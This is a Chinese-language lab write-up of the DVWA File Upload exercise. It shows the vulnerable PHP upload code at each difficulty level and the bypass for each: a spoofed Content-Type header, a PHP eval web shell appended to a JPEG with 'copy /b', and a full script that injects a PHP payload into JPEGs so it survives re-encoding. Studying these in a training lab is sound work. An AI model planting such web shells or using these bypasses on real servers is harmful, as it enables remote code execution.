---
layout: post
title: "DVWA File Upload (教學用)"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_File_Upload
author: ""
tags: ['DVWA', 'File_Upload']
---



# DVWA File Upload (教學用)
###### tags: `DVWA`

## low:

圖片上傳。

我上傳了 .txt 可成功。

顯示:
```
../../hackable/uploads/123.txt succesfully uploaded!
```



### html
```htmlembedded
<form enctype="multipart/form-data" action="#" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000">
    Choose an image to upload:<br><br>
    <input name="uploaded" type="file"><br>
    <br>
    <input type="submit" name="Upload" value="Upload">

</form>
```

### php
```php
<?php


if( isset( $_POST[ 'Upload' ] ) ) {
     //hackable/uploads/
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    
    //hackable/uploads/123.txt
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>

```

他沒有判斷圖片的機制。

所以都能上傳。







## medium

```htmlembedded
<form enctype="multipart/form-data" action="#" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000">
    Choose an image to upload:<br><br>
    <input name="uploaded" type="file"><br>
    <br>
    <input type="submit" name="Upload" value="Upload">

</form>
```


### 上傳 123.txt BP 抓包 
```http
POST /vulnerabilities/upload/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=-----5830457732236538913873874078--

```


### Content-Type:
```
Content-Type: text/plain
```

有些時候，會判斷這個字段確認是否為圖片類型。

改成
```
Content-Type: image/jpeg
```

可以通過。

### code:
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    //關鍵點。
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```


跟我們猜想的一樣，所以很好繞過。

## high


code:
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>

```



1. 白名單，jpg /jpeg

2. getimagesize()

用於取得圖像大小，如果指定的圖像或其不是有效的圖像，getimagesize()將返回false並產生一條E_WARNING級的錯誤



這種白名單的，過濾很嚴格，但他沒判斷圖片的內容


### 繞過

準備一個123.jpg

一句話: hack.php
```
?php @eval($_POST[x]); ?>
```

cmd
```
copy 123.jpg/b+ hack.php hack.jpg
```
* notepad 打開hack.jpg 檢查一下有沒出現你的一句話

有的話上傳。


## impossible

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Where are we going to be writing to?
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
        ( $uploaded_size < 100000 ) &&
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
        if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $temp_file, 100);
        }
        else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $temp_file, 9);
        }
        imagedestroy( $img );

        // Can we move the file to the web root from the temp folder?
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
            // Yes!
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";
        }
        else {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }

        // Delete any temp files
        if( file_exists( $temp_file ) )
            unlink( $temp_file );
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```


```
GD 庫
imagecreatefromjpeg 

imagejpeg
```


感覺是有機會繞過的，

外國大老的腳本
```
<?php

    /*



    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().

    It is necessary that the size and quality of the initial image are the same as those of the processed image.



    1) Upload an arbitrary image via secured files upload script

    2) Save the processed image and launch:

    jpg_payload.php <jpg_name.jpg>



    In case of successful injection you will get a specially crafted image, which should be uploaded again.



    Since the most straightforward injection method is used, the following problems can occur:

    1) After the second processing the injected data may become partially corrupted.

    2) The jpg_payload.php script outputs "Something's wrong".

    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.



    Sergey Bobrov @Black2Fan.



    See also:

    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/



    */



    $miniPayload = "<?php phpinfo();?>";





    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {

        die('php-gd is not installed');

    }



    if(!isset($argv[1])) {

        die('php jpg_payload.php <jpg_name.jpg>');

    }



    set_error_handler("custom_error_handler");



    for($pad = 0; $pad < 1024; $pad++) {

        $nullbytePayloadSize = $pad;

        $dis = new DataInputStream($argv[1]);

        $outStream = file_get_contents($argv[1]);

        $extraBytes = 0;

        $correctImage = TRUE;



        if($dis->readShort() != 0xFFD8) {

            die('Incorrect SOI marker');

        }



        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {

            $marker = $dis->readByte();

            $size = $dis->readShort() - 2;

            $dis->skip($size);

            if($marker === 0xDA) {

                $startPos = $dis->seek();

                $outStreamTmp = 

                    substr($outStream, 0, $startPos) . 

                    $miniPayload . 

                    str_repeat("\0",$nullbytePayloadSize) . 

                    substr($outStream, $startPos);

                checkImage('_'.$argv[1], $outStreamTmp, TRUE);

                if($extraBytes !== 0) {

                    while((!$dis->eof())) {

                        if($dis->readByte() === 0xFF) {

                            if($dis->readByte !== 0x00) {

                                break;

                            }

                        }

                    }

                    $stopPos = $dis->seek() - 2;

                    $imageStreamSize = $stopPos - $startPos;

                    $outStream = 

                        substr($outStream, 0, $startPos) . 

                        $miniPayload . 

                        substr(

                            str_repeat("\0",$nullbytePayloadSize).

                                substr($outStream, $startPos, $imageStreamSize),

                            0,

                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 

                                substr($outStream, $stopPos);

                } elseif($correctImage) {

                    $outStream = $outStreamTmp;

                } else {

                    break;

                }

                if(checkImage('payload_'.$argv[1], $outStream)) {

                    die('Success!');

                } else {

                    break;

                }

            }

        }

    }

    unlink('payload_'.$argv[1]);

    die('Something\'s wrong');



    function checkImage($filename, $data, $unlink = FALSE) {

        global $correctImage;

        file_put_contents($filename, $data);

        $correctImage = TRUE;

        imagecreatefromjpeg($filename);

        if($unlink)

            unlink($filename);

        return $correctImage;

    }



    function custom_error_handler($errno, $errstr, $errfile, $errline) {

        global $extraBytes, $correctImage;

        $correctImage = FALSE;

        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {

            if(isset($m[1])) {

                $extraBytes = (int)$m[1];

            }

        }

    }



    class DataInputStream {

        private $binData;

        private $order;

        private $size;



        public function __construct($filename, $order = false, $fromString = false) {

            $this->binData = '';

            $this->order = $order;

            if(!$fromString) {

                if(!file_exists($filename) || !is_file($filename))

                    die('File not exists ['.$filename.']');

                $this->binData = file_get_contents($filename);

            } else {

                $this->binData = $filename;

            }

            $this->size = strlen($this->binData);

        }



        public function seek() {

            return ($this->size - strlen($this->binData));

        }



        public function skip($skip) {

            $this->binData = substr($this->binData, $skip);

        }



        public function readByte() {

            if($this->eof()) {

                die('End Of File');

            }

            $byte = substr($this->binData, 0, 1);

            $this->binData = substr($this->binData, 1);

            return ord($byte);

        }



        public function readShort() {

            if(strlen($this->binData) < 2) {

                die('End Of File');

            }

            $short = substr($this->binData, 0, 2);

            $this->binData = substr($this->binData, 2);

            if($this->order) {

                $short = (ord($short[1]) << 8) + ord($short[0]);

            } else {

                $short = (ord($short[0]) << 8) + ord($short[1]);

            }

            return $short;

        }



        public function eof() {

            return !$this->binData||(strlen($this->binData) === 0);

        }

    }

?>
```


不過在impossible 難度下都備轉碼了。 (有空再研究)





## 其他繞過方式:
https://lnng.top/posts/4f5f.html